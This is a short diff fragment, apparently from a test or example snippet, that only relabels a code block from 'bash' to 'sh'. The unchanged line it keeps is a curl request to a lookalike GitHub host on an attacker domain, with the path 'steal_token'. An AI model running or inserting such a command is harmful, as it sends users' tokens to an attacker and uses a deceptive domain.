@@ -1,5 +1,5 @@
 
-""" bash
+""" sh
 curl -X GET "https://api.github.com.attacker.com/steal_token"
 """
 
